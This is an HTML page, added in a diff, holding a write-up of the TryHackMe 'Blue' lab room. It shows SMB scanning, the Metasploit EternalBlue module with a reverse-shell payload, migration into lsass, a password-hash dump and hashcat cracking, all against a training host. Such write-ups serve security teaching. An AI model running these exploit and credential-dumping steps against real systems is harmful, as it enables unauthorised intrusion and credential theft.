@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Blue | Paracausal Telemetry</title><meta name="description" content="TryHackMe beginner Windows exploitation room focused on SMB enumeration, MS17-010 EternalBlue exploitation, Meterpreter migration, hash dumping, and flag…" /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/thm/red/thm-blue/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Blue" /><meta property="og:description" content="TryHackMe beginner Windows exploitation room focused on SMB enumeration, MS17-010 EternalBlue exploitation, Meterpreter migration, hash dumping, and flag…" /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/thm/red/thm-blue/" /><meta property="og:image" content="https://paracausaltelemetry.com/src/og/writeups.png?v=pt" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Blue" /><meta name="twitter:description" content="TryHackMe beginner Windows exploitation room focused on SMB enumeration, MS17-010 EternalBlue exploitation, Meterpreter migration, hash dumping, and flag…" /><meta name="twitter:image" content="https://paracausaltelemetry.com/src/og/writeups.png?v=pt" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-quote2" /><style>.learn-breadcrumbs a{display:inline-flex;align-items:center;min-height:24px}.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Blue","description":"TryHackMe beginner Windows exploitation room focused on SMB enumeration, MS17-010 EternalBlue exploitation, Meterpreter migration, hash dumping, and flag…","url":"https://paracausaltelemetry.com/writeups/thm/red/thm-blue/","datePublished":"2026-04-06","keywords":"TryHackMe, Windows, SMB, EternalBlue, Metasploit, Meterpreter, Hash Cracking","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Blue","item":"https://paracausaltelemetry.com/writeups/thm/red/thm-blue/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><div class="header-actions" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/projects/">Projects</a><a href="/writeups/" aria-current="page">Writeups</a><a href="https://alchemist.paracausaltelemetry.com/">Alchemist</a><a href="/observer/">Observer</a><a href="/threat-actors/">Threat Actors</a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Blue</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">TryHackMe · 2026-04-06 · 12 min read</p><h1>Blue</h1><p>TryHackMe beginner Windows exploitation room focused on SMB enumeration, MS17-010 EternalBlue exploitation, Meterpreter migration, hash dumping, and flag discovery.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · easy</span><span class="writeup-chip">OS · Windows</span><span class="writeup-chip writeup-chip-tag">TryHackMe</span><span class="writeup-chip writeup-chip-tag">Windows</span><span class="writeup-chip writeup-chip-tag">SMB</span><span class="writeup-chip writeup-chip-tag">EternalBlue</span><span class="writeup-chip writeup-chip-tag">Metasploit</span><span class="writeup-chip writeup-chip-tag">Meterpreter</span><span class="writeup-chip writeup-chip-tag">Hash Cracking</span></div><p class="writeup-sources"><a href="https://tryhackme.com/room/blue" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/THM/RED/thm-blue.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><div class="markdown-body"><h1>CTF Room: Blue</h1><ul><li><a href="https://tryhackme.com/room/blue" target="_blank" rel="noreferrer">Link to room</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>Category:</strong> EternalBlue (CVE)</li></ul><h2>1. Brief</h2><p>Deploy &amp; hack into a Windows machine, leveraging common misconfigurations issues.</p><h2>2. Questions</h2><h4>Task 1: Recon</h4><p>Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. <strong>This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.</strong></p><h3>NMAP Scan</h3><pre><span class="bt-code-lang" aria-hidden="true">bash</span><code class="language-bash">nmap -sV -sC -Pn -p- blue.thm</code></pre><pre><span class="bt-code-lang" aria-hidden="true">bash</span><code class="language-bash">Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 17:07 +0100
+Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 33.33% done; ETC: 17:09 (0:00:22 remaining)
+Stats: 0:01:05 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 44.44% done; ETC: 17:09 (0:00:39 remaining)
+Nmap scan report for blue.thm (10.80.187.168)
+Host is up (0.020s latency).
+Not shown: 65526 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+| rdp-ntlm-info:
+|   Target_Name: JON-PC
+|   NetBIOS_Domain_Name: JON-PC
+|   NetBIOS_Computer_Name: JON-PC
+|   DNS_Domain_Name: Jon-PC
+|   DNS_Computer_Name: Jon-PC
+|   Product_Version: 6.1.7601
+|_  System_Time: 2026-04-06T16:09:31+00:00
+|_ssl-date: 2026-04-06T16:09:37+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=Jon-PC
+| Not valid before: 2026-04-05T16:07:20
+|_Not valid after:  2026-10-05T16:07:20
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49160/tcp open  msrpc         Microsoft Windows RPC
+49177/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: JON-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 0a:7f:8f:16:c0:c7 (unknown)
+| smb2-time:
+|   date: 2026-04-06T16:09:32
+|_  start_date: 2026-04-06T16:06:35
+| smb-os-discovery:
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Jon-PC
+|   NetBIOS computer name: JON-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2026-04-06T11:09:32-05:00
+| smb2-security-mode:
+|   2.1:
+|_    Message signing enabled but not required
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: 1h00m00s, deviation: 2h14m10s, median: 0s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 98.89 seconds
+</code></pre><p>From this extensive scan, we can see that the following ports are open:</p><ul><li>135</li><li>139</li><li>445</li></ul><p>The machine is exposing its SMB service to us, older versions of SMB are well known to have been riddled with vulnerabilities, lets enumerate the service more and see what we have on this machine.</p><h3>SMB service enumeration</h3><pre><span class="bt-code-lang" aria-hidden="true">bash</span><code class="language-bash">nmap -p445 --script smb-protocols blue.thm</code></pre><pre><span class="bt-code-lang" aria-hidden="true">bash</span><code class="language-bash">tarting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 17:10 +0100
+Nmap scan report for blue.thm (10.80.187.168)
+Host is up (0.023s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-protocols:
+|   dialects:
+|     NT LM 0.12 (SMBv1) [dangerous, but default]
+|     2.0.2
+|_    2.1
+
+Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds</code></pre><p>Now, I will use the smb-enum-shares script to see what shares are accessible and if any have anonymous access. We find that this is not the case and so will need some credentials. Rats!</p><h3>SMB share enumeration</h3><pre><span class="bt-code-lang" aria-hidden="true">bash</span><code class="language-bash">nmap -p 139,445 --script smb-enum-shares blue.thm</code></pre><pre><span class="bt-code-lang" aria-hidden="true">bash</span><code class="language-bash">Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 17:11 +0100
+Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 0.00% done
+Nmap scan report for blue.thm (10.80.187.168)
+Host is up (0.022s latency).
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares:
+|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
+|   account_used: &lt;blank&gt;
+|   \\10.80.187.168\ADMIN$:
+|     warning: Couldn&#39;t get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: &lt;none&gt;
+|   \\10.80.187.168\C$:
+|     warning: Couldn&#39;t get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: &lt;none&gt;
+|   \\10.80.187.168\IPC$:
+|     warning: Couldn&#39;t get details for share: NT_STATUS_ACCESS_DENIED
+|_    Anonymous access: READ
+
+Nmap done: 1 IP address (1 host up) scanned in 19.97 seconds
+</code></pre><p>So, we know that we need credentials that we currently do not have. We also konw that this machine is using SMBv1. Lets investigate vulnerabilities within SMBv1 on Windows. Elementary my dear Watson, it would appear we have a vulnerability called <strong>EternalBlue</strong>... What is this?</p><p><strong>EternalBlue {MS17-010}</strong></p><blockquote><p>EternalBlue is a vulnerability exploit developed by the NSA, it was held as a zero-day undisclosed exploit by the NSA until 2017, when the hacking group &quot;Shadow Brokers&quot; released it into the public eye.</p><p>The vulnerability (MS17-010) allows attackers to execute arbitrary code on a system by sending custom messages to the SMBv1 server. It was patched following its disclosure but leaves SMBv1 vulnerable.</p><p>An interesting point to note is that if one device is infected via EternalBlue, it puts other devices on the network at risk. A good example of this is the WannaCry ransomware attack against the NHS.</p></blockquote><h4>Task 2: Gaining Access</h4><p>Exploit the machine and gain a foothold.</p><p>Lets start up metasploit and take advantage of this vulnerability using the pre-packaged exploit.</p><h3>Starting Metasploit and locating the package</h3><pre><span class="bt-code-lang" aria-hidden="true">bash</span><code class="language-bash">msfconsole</code></pre><pre><span class="bt-code-lang" aria-hidden="true">bash</span><code class="language-bash">msf &gt; search ms17-010
+
+Matching Modules
+================
+
+   #   Name                                           Disclosure Date  Rank     Check  Description
+   -   ----                                           ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1     \_ target: Automatic Target                  .                .        .      .
+   2     \_ target: Windows 7                         .                .        .      .
+   3     \_ target: Windows Embedded Standard 7       .                .        .      .
+   4     \_ target: Windows Server 2008 R2            .                .        .      .
+   5     \_ target: Windows 8                         .                .        .      .
+   6     \_ target: Windows 8.1                       .                .        .      .
+   7     \_ target: Windows Server 2012               .                .        .      .
+   8     \_ target: Windows 10 Pro                    .                .        .      .
+   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
+   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   11    \_ target: Automatic                         .                .        .      .
+   12    \_ target: PowerShell                        .                .        .      .
+   13    \_ target: Native upload                     .                .        .      .
+   14    \_ target: MOF upload                        .                .        .      .
+   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   18    \_ AKA: ETERNALBLUE                          .                .        .      .
+   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   23    \_ AKA: ETERNALBLUE                          .                .        .      .
+   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   Yes    MS17-010 SMB RCE Detection
+   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
+   26    \_ AKA: ETERNALBLUE                          .                .        .      .
+   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+   28    \_ target: Execute payload (x64)             .                .        .      .
+   29    \_ target: Neutralize implant                .                .        .      .
+
+
+Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
+After interacting with a module you can manually set a TARGET with set TARGET &#39;Neutralize implant&#39;</code></pre><h3>EternalBlue configuration</h3><pre><span class="bt-code-lang" aria-hidden="true">bash</span><code class="language-bash">use exploit/windows/smb/ms17_010_eternalblue
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; options</code></pre><pre><span class="bt-code-lang" aria-hidden="true">bash</span><code class="language-bash">msf &gt; use 0
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf exploit(windows/smb/ms17_010_eternalblue) &gt; show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploi
+                                             t.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Wi
+                                             ndows 7, Windows Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Window
+                                             s 7, Windows Embedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windo
+                                             ws Embedded Standard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+   LHOST     192.168.145.145  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+</code></pre><p>Now that we have the options for this exploit, we can set it ready to run and exploit the machine :)</p><h3>EternalBlue set options</h3><pre><span class="bt-code-lang" aria-hidden="true">bash</span><code class="language-bash">set RHOSTS blue.thm
+set payload windows/x64/shell/reverse_tcp
+run</code></pre><p>We should see that the exploit has run and we have gained a shell on the machine, if not go back a step and ensure all settings are correct. Assuming you have made it to this stage, lets now try and upgrade to a Meterpreter shell!</p><h4>Task 3: Escalate</h4><p>Escalate privileges, learn how to upgrade shells in metasploit.</p><p><strong>Meterpreter Shells</strong></p><blockquote><p>When using MSF, we can upgrade from a regular shell to a meterpreter shell, this is a native metasploit shell that gives us many more features than a regular shell like being able to quickly deploy kiwi (mimikatz) to escalate to root.</p><p>To do this, we can use the package: <strong>post/multi/manage/shell_to_meterpreter</strong></p></blockquote><pre><span class="bt-code-lang" aria-hidden="true">bash</span><code class="language-bash">sessions -u 2</code></pre><p>Now that we have a meterpreter session on the machine, lets use ps to investigate the processes on this system.</p><pre><span class="bt-code-lang" aria-hidden="true">bash</span><code class="language-bash">ps</code></pre><pre><span class="bt-code-lang" aria-hidden="true">text</span><code class="language-text">Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System                x64   0
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 544   492   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 552   684   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 588   684   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 592   492   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 600   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 640   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 684   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 704   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 712   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 816   684   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 888   684   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 940   684   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1004  640   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 1080  684   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1204  684   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 1352  684   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1404  684   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1484  684   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ 1600  684   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1828  816   WmiPrvSE.exe
+ 1920  2192  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
+ 1976  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 2068  1600  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe
+ 2076  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 2192  684   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 2216  684   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
+ 2356  684   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
+ 2412  684   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 2980  684   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 3012  684   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
+ 3052  684   svchost.exe           x64   0        NT AUTHORITY\SYSTEM</code></pre><p>We locate the process that is running as NT AUTHORITY\SYSTEM as <strong>lsass.exe</strong>. We migrate to it using its PID (<strong>704</strong>)</p><pre><span class="bt-code-lang" aria-hidden="true">bash</span><code class="language-bash">migrate 704</code></pre><pre><span class="bt-code-lang" aria-hidden="true">text</span><code class="language-text"></code></pre><p><strong>Escalation via meterpreter</strong></p><blockquote><p>Please note, whilst the room shows you how to escalate via the main shell we spawned it is also possible to escalate through other methods in the meterpreter shell. Feel free to do the room again and investigate this, commands like sysinfo and hashdump allow us to grab key system data needed to gain credentials. Once we have said credentials, hashcat can be used to retrieve the plaintext password!</p></blockquote><h4>Task 4: Cracking</h4><p>Dump the non-default user&#39;s password and crack it!</p><p>As mentioned above we can run the command hashdump.</p><pre><span class="bt-code-lang" aria-hidden="true">bash</span><code class="language-bash">hashdump
+
+echo &quot;hash&quot; &gt;&gt; Jon.hash</code></pre><pre><span class="bt-code-lang" aria-hidden="true">text</span><code class="language-text">meterpreter &gt; migrate 704
+[*] Migrating from 2192 to 704...
+[*] Migration completed successfully.
+meterpreter &gt; hashdump
+Administrator:500:::::
+Guest:501:::::
+Jon:1000:::::
+</code></pre><p>Once we have the password hash for the non-default user (Jon) we can crack it using hashcat :)</p><pre><span class="bt-code-lang" aria-hidden="true">bash</span><code class="language-bash">hashcat -m 1000 /usr/share/wordlists/rockyou.txt Jon.hash</code></pre><pre><span class="bt-code-lang" aria-hidden="true">text</span><code class="language-text">hashed password &gt; plaintext password :)</code></pre><p>Now we have the credentials <strong>Jon:</strong>, using this we can login legitimately at any time, the user belongs to us now.</p><h4>Task 5: Find flags!</h4><p>Find the three flags planted on this machine. These are not traditional flags, rather, they&#39;re meant to represent key locations within the Windows system. Use the hints provided below to complete this room!</p><p>Lets start at the root directory, could there be a flag there?</p><pre><span class="bt-code-lang" aria-hidden="true">bash</span><code class="language-bash">cd C:\
+dir
+cat flag1.txt
+
+Listing: C:\
+============
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+040777/rwxrwxrwx  0      dir   2018-12-13 03:13:36 +0000  $Recycle.Bin
+040777/rwxrwxrwx  0      dir   2009-07-14 06:08:56 +0100  Documents and Settings
+040777/rwxrwxrwx  0      dir   2009-07-14 04:20:08 +0100  PerfLogs
+040555/r-xr-xr-x  4096   dir   2019-03-17 22:22:01 +0000  Program Files
+040555/r-xr-xr-x  4096   dir   2019-03-17 22:28:38 +0000  Program Files (x86)
+040777/rwxrwxrwx  4096   dir   2019-03-17 22:35:57 +0000  ProgramData
+040777/rwxrwxrwx  0      dir   2018-12-13 03:13:22 +0000  Recovery
+040777/rwxrwxrwx  4096   dir   2026-04-06 17:47:11 +0100  System Volume Information
+040555/r-xr-xr-x  4096   dir   2018-12-13 03:13:28 +0000  Users
+040777/rwxrwxrwx  16384  dir   2026-04-06 17:22:34 +0100  Windows
+040777/rwxrwxrwx  0      dir   2026-04-06 17:07:28 +0100  badr
+100666/rw-rw-rw-  24     fil   2019-03-17 19:27:21 +0000  flag1.txt
+000000/---------  0      fif   1970-01-01 01:00:00 +0100  hiberfil.sys
+000000/---------  0      fif   1970-01-01 01:00:00 +0100  pagefile.sys
+</code></pre><p>Next, can we find a flag where passwords are stored on Windows, lets have a look...</p><pre><span class="bt-code-lang" aria-hidden="true">bash</span><code class="language-bash">cd C:\Windows\System32\Config
+pwd
+dir | findstr &quot;flag*&quot;</code></pre><pre><span class="bt-code-lang" aria-hidden="true">text</span><code class="language-text">flag2.txt should be visible!</code></pre><p>Great Success! Now, lets find flag 3, we know that it is in an excellent location to loot, lets have a look in Jon&#39;s Documents folder...</p><pre><span class="bt-code-lang" aria-hidden="true">text</span><code class="language-text">cd C:\Users\Jon\Documents
+pwd
+dir</code></pre><pre><span class="bt-code-lang" aria-hidden="true">text</span><code class="language-text">flag3.txt is in there!</code></pre><p>Perfect! 3 flags retrieved, very well done :)</p></div><footer class="writeup-article-footer"><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/projects/">Projects</a><a href="/writeups/">Writeups</a><a href="/observer/">Observer</a><a href="/threat-actors/">Threat Actors</a></nav></div><div class="footer-nav-group"><span>Information</span><nav class="footer-links footer-links-utility" aria-label="Site information"><a href="/credentials/">Credentials</a><a href="/design/">Design</a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div></body></html>
